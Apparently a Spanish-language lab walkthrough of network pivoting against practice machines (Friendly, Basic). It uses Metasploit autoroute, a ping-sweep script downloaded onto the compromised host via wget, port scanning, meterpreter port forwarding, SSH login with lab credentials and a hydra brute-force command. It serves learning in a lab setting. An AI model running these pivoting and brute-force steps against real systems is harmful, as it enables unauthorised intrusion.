Maquinas que vamos a utilizar **Kali Linux , Friendly y Basic.**

  

[https://hackmyvm.eu/machines/machine.php?vm=Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly)

[VulNyx | Offensive Security Playground](https://vulnyx.com/#basic)

  

> [!important] **Seguimos donde lo dejamos desde donde lo dejamos en la sesión de meterpreter que habíamos conseguido de la maquina intermedia.**

  

- Miramos las interfaces de red que tenemos disponibles
    
    `ifconfig`
    
    ![[Imagenes/image 64.png|image 64.png]]
    
    Nos encontramos con la interface donde nos encontramos **10.0.3.21/24** y una nueva interface **10.10.10.6/24.**
    
      
    
- Hacemos un **Background** para dejar la sesión en segundo plano.
    
    `CTRL+Z`
    
    ![[Imagenes/image 1 53.png|image 1 53.png]]
    

- Miramos el numero de ID de sesión.
    
    `sessions -l`
    
    ![[Imagenes/image 2 52.png|image 2 52.png]]
    

  

- En rutamos el trafico con el modulo **/multi/manage/autoroute** y completamos los datos que nos pida y ejecutamos.
    
    `use /multi/manage/autoroute`
    
    `show options`
    
    `set SESSION 2`
    
    `show options`
    
    ![[Imagenes/image 3 51.png|image 3 51.png]]
    
      
    
    `run`
    
    ![[Imagenes/image 4 48.png|image 4 48.png]]
    
      
    
- Vamos a verlo
    
    `route`
    
    ![[Imagenes/image 5 47.png|image 5 47.png]]
    
      
    

- **Metasploit tiene muchos módulos para escaneo de las redes** pero d**an muchos errores**. En una terminal nueva vamos a hacer es **hacer un script y ejecutarlo dentro de la maquina victima**.
    
    `nano escaner.sh`
    
    ```Bash
    #! /bin/bash
    
    for i in {1..255}; do
        timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
        if [ $? -eq 0 ]; then
            echo "El host 10.10.10.$i está activo"
        fi
    done
    ```
    
    > [!important] **Abría que adaptarlo a cada red interna que descubrir.**
    
    ![[Imagenes/image 6 44.png|image 6 44.png]]
    
- Levantamos un servidor web con Python.
    
    ```Bash
    python3 -m http.server 80
    ```
    
    ![[Imagenes/image 7 42.png|image 7 42.png]]
    
      
    
    - **En metasploit entramos en la sesión** que teníamos **abierta** en la maquina intermedia.
        
        `sessions -l`
        
        `sessions -i 2`
        
        ![[Imagenes/image 8 40.png|image 8 40.png]]
        

- Lanzamos una **shell para ejecutar comandos de Linux** ya que nos vamos a descargar dentro de la maquina intermedia el script que habíamos creado.
    
    `shell`
    
    `ls`
    
    `wget 10.0.3.4/escaner.sh`
    
    `l`
    
    ![[Imagenes/image 9 37.png|image 9 37.png]]
    
      
    
- Le damos el **permisos de ejecución y lo ejecutamos**.
    
    `chmod +x escaner.sh`
    
    `./escaner.sh`
    
    ![[Imagenes/image 10 33.png|image 10 33.png]]
    
    La IPs 10.10.10.1 y 10.10.10.2 van a ser puertas de enlace. las demás tendríamos que hace escaneos.
    
    Para ahorrar tiempo la IP que nos interesa es la 10.10.10.7. **Ya tenemos nuestra IP objetivo.**
    
    **CTRL+C** para parar el escaneo y hacemos un Background con **CTRL+Z**
    
    `CTRL+C`
    
    `CTRL+Z`
    
    ![[Imagenes/image 11 27.png|image 11 27.png]]
    
      
    
- Vamos a utilizar otro modulo para **hacer un escaneo de puertos**. **scanner/portscan/tcp .**
    
    `use scanner/portscan/tcp`
    
    ![[Imagenes/image 12 27.png|image 12 27.png]]
    
      
    
- Miramos las opciones. las completamos y ejecutamos el modulo.
    
    `show options`
    
    `set RHOST 10.10.10.7`
    
    `set PORTS 1-12500` → **Dependería del rango de puertos que queremos escanear**.
    
    ![[Imagenes/image 13 25.png|image 13 25.png]]
    
      
    
    `run`
    
    ![[Imagenes/image 14 23.png|image 14 23.png]]
    

  

---

  

  

- Vamos a atacar el **puerto 22** por lo tanto vamos hacer **port fowarding o reenvió de puertos** trayendo el puerto a puerto de mi maquina local. para ello debemos hacerlo en meterpreter.
    
    `sessions -l`
    
    `sessions -i 2`
    
    `portfwd add -l 222 -p 22 -r 10.10.10.7`
    
      
    
    > [!important] `portfwd add` → Agrega una nueva regla de reenvío de puertos.
    > 
    > `l 222` → Especifica el puerto local en el sistema atacante donde se escuchará la conexión.
    > 
    > `p 22` → Especifica el puerto de destino en la máquina remota (en este caso, el puerto SSH).
    > 
    > `r 10.10.10.7` → Especifica la dirección IP del sistema remoto al que se redirigirán las conexiones.
    > 
    > Este comando crea un túnel desde el sistema atacante, permitiendo que cualquier conexión al puerto `222` en la máquina atacante sea redirigida al puerto `22` en `10.10.10.7`. Esto permite al atacante conectarse de manera indirecta a la máquina objetivo a través de su propia máquina.
    
      
    
    ![[Imagenes/image 15 20.png|image 15 20.png]]
    
      
    

- **Accedemos al puerto 22 de la maquina victima final**. En nuestra Kali abrimos un terminal y entramos por SSH.
    
    > [!important] Recordemos que esta maquina ya la habíamos hecho y que el **usuario** es **dimitri** y la **contraseña** es **mememe.**
    
      
    
    `ssh` `dimitri@127.0.0.1` `-p 222`
    
      
    
    > [!important] `ssh` → Es el cliente SSH que se utiliza para conectarse de forma segura a otro sistema.
    > 
    > `dimitri@127.0.0.1` → Indica que el usuario `dimitri` quiere conectarse a la dirección IP `127.0.0.1`, que representa la máquina local (localhost).
    > 
    > `p 222` → Especifica que la conexión debe hacerse usando el puerto `222` que es donde hemos hecho el reenvio en lugar del puerto por defecto de SSH (`22`).
    
      
    
    ![[Imagenes/image 16 17.png|image 16 17.png]]
    
      
    
- Si por ejemplo quisiera hacer aquí un ataque con hydra a este puerto seria asi:
    
    ```Bash
    hydra -l dimitri -P /usr/share/wordlists/rockyou.txt -t 4 ssh://127.0.0.1 -s 222
    ```
    
      
    
    ---
    
      
    
    - Vamos a atacar el **puerto 631** por lo tanto vamos hacer **port fowarding o reenvió de puertos** trayendo el puerto a puerto de mi maquina local. para ello debemos hacerlo en meterpreter.
        
        `portfwd add -l 5000 -p 631 -r 10.10.10.7`
        
        ![[Imagenes/image 17 14.png|image 17 14.png]]
        
          
        
- Como es Sabemos por un ejercicio anterior que es un servicio web abrimos un navegador web y escribimos 127.0.0.1:5000.
    
    `http://127.0.0.1:5000/`
    
    ![[Imagenes/image 18 12.png|image 18 12.png]]